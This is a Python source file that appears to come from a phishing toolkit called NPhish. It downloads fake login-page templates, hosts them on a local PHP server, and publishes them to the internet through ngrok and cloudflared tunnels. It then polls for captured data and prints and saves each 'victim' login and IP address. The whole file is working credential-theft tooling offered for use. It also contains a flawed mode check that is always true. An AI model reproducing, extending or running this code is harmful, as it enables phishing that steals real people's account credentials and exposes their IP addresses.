import os
from os import popen, system
from time import sleep

def requirements(folder, port, mode):
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            if not os.path.isfile(root+"/.websites/"+folder+"/index.html"):
                system(f"rm -rf {root}/.websites/{folder}")
                requirements(folder, port, mode)
            else:
                system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
                break
        else:
            check_intr()
            print("\n"+info+"Downloading required files.....\n"+nrml)
            check_intr()
            system(f"wget -q --show-progress https://github.com/CodingSangh/NPhish/raw/main/Websites/{folder}.zip -O websites.zip")
            if not os.path.exists(root+"/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system(f"unzip websites.zip -d $HOME/.websites/  > /dev/null 2>&1 ")
            os.remove("websites.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break

    system("mv -f .info.txt $HOME/.site")
    server(port, mode)

def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")

def server(port, mode):
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    system("clear")
    print("\n"+info2+"Initializing PHP server at localhost:"+str(port)+"....")
    check_intr()
    system("cd $HOME/.site && php -S 0.0.0.0:"+str(port)+" > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 0.0.0.0:"+str(port)):
            print("\n"+info+"PHP Server has started successfully!")
            break
        else:
            print(error+"PHP Error")
            killer()
            exit(1)
    print(mode)
    if mode == 0:
        print("\n"+"Getting credentials!")
        get_credentials()
    elif mode == "1" or 1:
        print("\n"+info2+"Initializing tunnelers at same address....."+nrml)
        check_intr()
        system("cd $HOME/.cloudflaredfolder && chmod +x * && cd $HOME && rm -rf log.txt")
        while True:
            if system("command -v termux-chroot > /dev/null 2>&1")==0:
                system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:"+str(port)+" > /dev/null 2>&1 &")
                system("cd $HOME/.cloudflaredfolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:"+str(port)+" --logfile log.txt > /dev/null 2>&1 &")
                break
            else:
                system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
                system("cd $HOME/.cloudflaredfolder && ./cloudflared tunnel -url 127.0.0.1:"+str(port)+" --logfile log.txt > /dev/null 2>&1 &")
                break
        ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
        if ngroklink.find("ngrok")!=-1:
            ngrokcheck=True
        else:
            ngrokcheck=False
        cflink=popen("cat ~/.cloudflaredfolder/log.txt | grep -o 'https://[-0-9a-z]*/.trycloudflare.com'").read()
        if cflink.find("cloudflare")!=-1:
            cfcheck=True
        else:
            cfcheck=False
        while True:
            from ngrock_cloudflare import url_manager, custom_url_ask
            from main import nc
            if ngrokcheck and cfcheck:
                url_manager(cflink, "1", "2")
                url_manager(ngroklink, "3", "4")
                custom_url_ask(cflink)
                break
            elif not ngrokcheck and cfcheck:
                url_manager(cflink, "1", "2")
                custom_url_ask(cflink)
                break
            elif not cfcheck and ngrokcheck:
                url_manager(ngroklink, "1", "2")
                custom_url_ask(ngroklink)
                break
            elif not (cfcheck and ngrokcheck):
                print("\n"+error+"Tunneling falied!"+nc+nrml)
                killer()
                exit()
            else:
                print("\n"+error+"Unknown error!"+nrml)
                killer()
                exit()

    print("\n"+"Getting credentials!")
    get_credentials()

def get_credentials():
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    print("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
                with open(root+"/.site/usernames.txt","r") as userfile:
                    userdata=userfile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Saved in ip.txt")
                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except:
        return

